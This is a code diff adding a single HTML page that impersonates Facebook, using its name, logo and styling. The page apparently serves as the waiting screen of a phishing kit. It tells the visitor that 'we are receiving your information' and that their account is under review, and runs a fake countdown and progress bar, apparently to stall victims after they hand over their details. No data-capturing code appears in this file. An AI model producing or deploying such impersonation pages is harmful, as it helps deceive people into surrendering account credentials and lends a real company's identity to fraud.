@@ -1,0 +1,332 @@
+
+<!doctype html>
+<html lang="en">
+
+<head>
+
+    <head>
+        <!-- Required meta tags -->
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+        <!-- Bootstrap CSS -->
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css"
+            integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+        <title>Facebook</title>
+        <script src="https://kit.fontawesome.com/83fd8385f7.js" crossorigin="anonymous"></script>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+
+
+        <link rel="icon" type="image/x-icon" href="default.ico">
+        <style type="text/css">
+            @font-face {
+  font-family: Helvetica, sans-serif;
+  src: url(images/Helvetica-Font/Helvetica.ttf);
+}
+
+*,body,p,span,a,div,tr,td,th,h1,h2 {
+  font-family: Helvetica;
+}
+            body {
+                background-color: #f0f2f5;
+                font-family: Helvetica;
+                -webkit-font-smoothing: antialiased;
+            }
+
+            .header {
+                background-color: white;
+                padding-top: 8px;
+                padding-bottom: 8px;
+                box-shadow: 1px 1px 8px 1px rgb(0 0 0 / 10%);
+            }
+
+            .main .card {
+                margin-top: 60px;
+                background-color: white;
+                padding-top: 16px;
+                padding-bottom: 0px;
+                padding-left: 16px;
+                padding-right: 16px;
+                border: none;
+                box-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
+                margin-bottom: 30px;
+            }
+
+            .main .open {
+                color: white;
+                padding: 4px 10px;
+                border-radius: 5px;
+            }
+
+            .ikonauser {
+                background-color: #c4c9cd;
+                border-radius: 50%;
+                font-size: 15px;
+                color: white;
+                padding: 10px;
+            }
+
+            label {
+                color: #90949c;
+                font-weight: bold;
+                font-size: 12px;
+            }
+
+            input[type=text],
+            textarea,
+            input[type=password] {
+                color: #495057;
+                background-color: #fff;
+                background-clip: padding-box;
+                border-radius: 0px !important;
+                border: 1px solid #ced4da;
+
+            }
+
+            .butoni {
+                background-color: #4267b2;
+                border: 1px solid #4267b2;
+                color: white;
+                margin-top: 15px;
+                font-size: 13px;
+                font-weight: 500;
+                padding: 7px 20px;
+                border-radius: 2px;
+                text-transform: none;
+                font-weight: bold;
+            }
+
+            .butoni:hover {
+                background-color: #444444;
+            }
+
+            #main {}
+
+            #fac {
+                margin-top: 50px;
+                display: none;
+                margin-bottom: 60px;
+            }
+
+            .twh3 {
+                border-bottom: 1px solid rgba(0, 0, 0, .101);
+                background-color: #f5f6f7;
+                font-size: 16px;
+                color: #4b4f56;
+                padding: 12px;
+                font-weight: 700;
+                border-top-left-radius: 8px;
+                border-top-right-radius: 8px;
+            }
+
+            #fac .card {
+                border-top-left-radius: 8px;
+                border-top-right-radius: 8px;
+            }
+
+            #fac .bodyyy p {
+                font-size: 15px;
+            }
+
+            #fac .bodyyy {
+                padding: 25px !important;
+                border-bottom: 1px solid rgba(0, 0, 0, .101);
+            }
+
+            #fac .footerii {
+                padding: 10px 20px !important;
+                background-color: #f5f6f7;
+                height: 55px;
+
+            }
+
+            .nolink {
+                color: black !important;
+                font-size: 14px !important;
+            }
+
+            #twof .modal-body {
+                font-size: 14px;
+            }
+
+            .paddingleftt {
+                padding-left: 12px;
+            }
+
+            @media only screen and (max-width: 600px) {}
+
+
+            @media (max-width: 400px) {
+                .linkupertwo {
+                    font-size: 12px !important;
+                    margin-top: 8px !important;
+                }
+            }
+
+            .btn:hover {
+                color: white !important;
+            }
+
+            .ourmessagiii {
+                font-family: "Arial";
+            }
+
+            #sendcodeagain {
+                display: none;
+                font-size: 14px;
+                padding-left: 0px;
+                color: #385898;
+            }
+
+            #sendcodeagain:hover {
+                color: #385898 !important;
+            }
+
+            .fotoh {
+                width: 94%;
+                margin: 0 auto;
+            }
+
+            /* Chrome, Safari, Edge, Opera */
+            input::-webkit-outer-spin-button,
+            input::-webkit-inner-spin-button {
+                -webkit-appearance: none;
+                margin: 0;
+            }
+
+            /* Firefox */
+            input[type=number] {
+                -moz-appearance: textfield;
+            }
+        </style>
+    </head>
+
+<body>
+    <section class="header">
+        <div class="fotoh">
+            <div class="row g-0">
+                <div class="col-6">
+                    <img src="Facebook_f_logo.png" class="img-fluid" width="40" />
+                </div>
+
+                <div class="col-6" style="text-align: right;">
+                    <!-- <div style="padding-top: 4px;">
+              <img src="" encodeURIComponent(image)" class="img-fluid" width="30" height="30" style="object-fit: cover; display: inline-block; border-radius: 50%;" />
+              <p style="display: inline-block; margin-bottom: 0px; font-weight: 600; font-size: 14px; color:#050505"></p>
+            </div>-->
+                    <p
+                        style="color:#3578e5; display:none; padding-top: 8px; margin-bottom: 0px; font-weight: 600; font-size: 15px;">
+                        <i style="font-size: 16px;" class="fa-solid fa-envelope"></i> Support Inbox
+                    </p>
+                </div>
+            </div>
+        </div>
+    </section>
+    <section id="fac" style="display: block;">
+        <div class="container px-4">
+            <div class="row justify-content-center g-0">
+                <div >
+                    <div class="card">
+                        <div class="bodyyy" style="max-width: 800px;">
+                            <div class="row g-0">
+                                <div class="col-auto my-auto pb-3 pb-md-0">
+                                    <img src="ref.png" style="width: 130px" alt="">
+                                </div>
+                                <div class="col-12 col-md-9">
+                                    <p><strong> Hi, We are receiving your information</strong></p>
+                                    <br />
+                                    <p>Reviewing your activity takes just a few more moments. We might require additional
+                                        information to confirm that this is your account</p>
+                                    <br />
+                                    <p>
+                                        Please wait, this could take up to 10-20 minutes, please be patient while we review your
+                                        case... (wait <span id="minute" class="numbers"></span>:<span id="second" class="numbers"></span>)
+                                    </p>
+                                    <div id="progressBar" >
+                                        <div></div>
+                                    </div>
+                                    <ul id="countdown" style="display:none;">
+                                        <li><span id="day" class="numbers">00</span>
+                                            <p class="name">days</p>
+                                        </li>
+                                        <li><span id="hour" class="numbers">00</span>
+                                            <p class="name">hours</p>
+                                        </li>
+        
+                                    </ul>
+                                </div>
+                            </div>
+                            
+                        </div>
+                    </div>
+                </div>
+            </div>
+    </section>
+    <style>
+        #progressBar {
+            width: 100%;
+            margin: 10px auto;
+            height: 22px;
+            background-color: #f0f2f5;
+        }
+
+        #progressBar div {
+            height: 100%;
+            text-align: right;
+            padding: 0 10px;
+            line-height: 22px;
+            /* same as #progressBar height if we want text middle aligned */
+            width: 0;
+            background-color: #3084f4;
+            box-sizing: border-box;
+        }
+    </style>
+    <script>
+        $(document).ready(function () {
+
+            //COUNTDOWN TIMER
+            //edit ".25" below to change time in terms of day
+            var deadline = new Date(Date.now() + 600000);
+
+            var x = setInterval(function () {
+
+                var now = Date.now();
+                var t = deadline - now;
+                var days = Math.floor(t / (1000 * 60 * 60 * 24));
+                var hours = Math.floor((t % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                var minutes = Math.floor((t % (1000 * 60 * 60)) / (1000 * 60));
+                var seconds = Math.floor((t % (1000 * 60)) / 1000);
+                document.getElementById("day").innerHTML = days;
+                document.getElementById("hour").innerHTML = hours;
+                document.getElementById("minute").innerHTML = minutes;
+                document.getElementById("second").innerHTML = seconds;
+                if (t < 0) {
+                    clearInterval(x);
+                    document.getElementById("day").innerHTML = '0';
+                    document.getElementById("hour").innerHTML = '0';
+                    document.getElementById("minute").innerHTML = '0';
+                    document.getElementById("second").innerHTML = '0';
+                }
+            }, 1000);
+
+            //COUNTDOWN BAR
+
+            function progress(timeleft, timetotal, $element) {
+                var progressBarWidth = timeleft * $element.width() / timetotal;
+                $element.find('div').animate({ width: progressBarWidth }, timeleft == timetotal ? 0 : 1000, 'linear');
+                if (timeleft > 0) {
+                    setTimeout(function () {
+                        progress(timeleft - 1, timetotal, $element);
+                    }, 1000);
+                }
+            };
+            //adjust these numbers to match time set
+            //must be in seconds
+            progress(1740, 1740, $('#progressBar'));
+
+        });
+    </script>
+</body>
+
+</html>
